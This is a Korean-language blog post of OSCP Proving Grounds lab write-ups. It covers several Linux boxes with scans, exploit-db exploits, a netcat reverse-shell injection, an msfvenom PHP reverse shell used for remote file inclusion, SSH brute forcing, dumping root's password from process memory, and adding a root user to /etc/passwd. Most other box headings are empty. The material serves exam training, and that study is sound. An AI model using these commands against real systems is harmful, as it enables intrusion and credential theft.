---
layout: post
title: OSCP Proving Ground
subtitle: OSCP Proving Ground WriteUp
author: g3rm
categories:
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - OSCP
sidebar:
---

## Info
OSCP 자격증 합격을 위해 유용한 문제들로 구성된 [리스트](https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/edit?pli=1&gid=487240997#gid=487240997)를 참고하여 풀이 방법을 남깁니다.

## Linux 
### ClamAV : 25 SMTP
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.xxx.xxx -oN xxx.xxx_allport
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.185], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info

# smtp get info
snmp-check 192.168.xxx.xxx -c public
[*] Processes:

  Id                    Status                Name                  Path                  Parameters                       
  3779                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl


# 실행중인 process 중 clamav-milter 에 취약점 있음
searchsploit clamav-milter
searchsploit -m 4761
perl 4761.pl 192.168.xxx.xxx
nc -nv 192.168.xxx.xxx 31337
```

### Pelican : Exhibitor - gcore
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.180.98 -oN 180.98_allport
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.180.98:8080/exhibitor/v1/ui/index.html

# 8080 : Exhibitor Web UI 1.7.1 - Remote Code Execution
# https://www.exploit-db.com/exploits/48654
$(/bin/nc -e /bin/sh kali_ip 8888 &)

# nc
nc -nvlp 8888
/usr/bin/script -qc /bin/bash /dev/null

# linpeas
python3 -m http.server 80
wget http://kali/linpeas.sh
./linpeas.sh

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                             
Matching Defaults entries for charles on pelican:                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
Sudoers file: /etc/sudoers.d/charles is readable
charles ALL=(ALL) NOPASSWD:/usr/bin/gcore

                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                          
                      ╚════════════════════════════════════╝                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid    
-rws--x--x 1 root root 17K Sep 10  2020 /usr/bin/password-store (Unknown SUID binary!)


╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes   
root       513  0.0  0.0   2276    72 ?        Ss   09:16   0:00 /usr/bin/password-store

# GTFObins
sudo gcore $PID
sudo -u root /usr/bin/gcore -a -o <outputfile> <pid>
strings <outputfile>
001 Password: root:
ClogKingpinInning731

# root 
95cee2bcb5cb60a70ef4c6bb62a36b64
su -
Password: ClogKingpinInning731
```

### Payday 
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.39 -oN 207.39_allport
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software

# web exploit
whatweb http://192.168.207.39
http://192.168.207.39 [200 OK] Apache[2.2.4], CS-Cart, Cookies[cart_languageC,csid,secondary_currencyC], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6], IP[192.168.207.39], Meta-Author[CS-Cart.com], PHP[5.2.3-1ubuntu6], PasswordField[password], PoweredBy[the], Script[javascript], Title[CS-Cart. Powerful PHP shopping cart software], X-Powered-By[PHP/5.2.3-1ubuntu6]

gobuster dir -u 192.168.207.39 -w /usr/share/wordlists/dirb/common.txt 
/admin.php            (Status: 200) [Size: 9483]
/admin                (Status: 200) [Size: 9483]

# admin:admin 추측
# https://www.exploit-db.com/exploits/48891 : CS-Cart 1.3.3 - authenticated RCE
Template editor에서 쉘 업로드 후 아래 url로 접근
http://192.168.207.39/skins/php-reverse-shell.phtml

# linpeas.sh 돌리기
# 별거없음

# ssh brute force
crackmapexec ssh 192.168.189.39 -u patrick -p /usr/share/wordlists/rockyou.txt
patrick:patrick
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.207.39

# escal
sudo -l
sudo su

```
### Snookums
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.58 -oN 207.58_allport
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery

# web
whatweb http://192.168.207.58
http://192.168.207.58 [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], Google-Analytics[UA-2196019-1], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[192.168.207.58], JQuery[1.7.2], Lightbox, PHP[5.4.16], Script, Title[Simple PHP Photo Gallery], X-Powered-By[PHP/5.4.16]

# web enum
dirsearch -u http://192.168.230.58 -w /usr/share/seclists/Discovery/Web-Content/big.txt -r -t 60 --full-url

# SimplePHPGal 0.7 - Remote File Inclusion
https://www.exploit-db.com/exploits/48424
msfvenom -p php/reverse_php LHOST=192.168.45.185 LPORT=8888 -f raw -o php_reverse_9999.pHP
http://192.168.207.58/image.php?img=http://192.168.45.185/php_reverse_8888.pHP

# config cat
cat /var/www/html/db.php
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
SimplePHPGal

# mysql login
mysql -u root -p
Enter password: MalapropDoffUtilize1337

use SimplePHPGal;
show tables;
select * from users;

Tables_in_SimplePHPGal
users
username        password
josh    VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
michael U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
serena  VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==

# password decode - HockSydneyCertify123
echo -n "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 -d
echo -n "SG9ja1N5ZG5leUNlcnRpZnkxMjM=" | base64 -d

# linpeas
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                
                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable                

# passwd 생성
openssl passwd -1 -salt password password 
echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd

```
### Bratarina
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.71 -oN 207.71_allport
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)

# 
crackmapexec smb 192.168.207.71 -u '' -p '' --shares
crackmapexec smb 192.168.207.71 -u '' -p '' --spider backups --regex .
SMB         192.168.207.71  445    BRATARINA        //192.168.207.71/backups/passwd.bak [lastm:'2020-07-06 16:46' size:1747]


```
### Pebbles
```shell

```
### Nibbles
```shell

```
### Hetemit
```shell

```
### ZenPhoto
```shell

```
### Nukem

### Cockpit

### Clue

### Extplorer

### Postfish

### Hawat

### Walla

### PC

### Apex

### Sorcerer

### Sybaris

### Peppo

### Hunit

### Readys

### Astronaut

### Bullybox

### Marketing

### Exfiltrated

### Fanatastic

### QuackerJack

### Wombo

### Flu

### Roquefort

### Levram

### Mzeeav

### LaVita

### Xposedapi

### Zipper

### Workaholic

### Fired

### Scrutiny

### SPX

### Vmdak

### Mantis

### BitForge


### WallpaperHub

### Zab

### SpiderSociety



## Windows
### Kevin

### Internal

### Algernon

### Jacko

### Craft

### Squid

### Nickel

### MedJed

### Billyboss

### Shenzi

### AuthBy

### Slort

### Hepet

### DVR4

### Mice

### Monster

### Fish


## AD
### Access

### Resourced

### Nagoya

### Hokkaido

### Hutch

### Vault










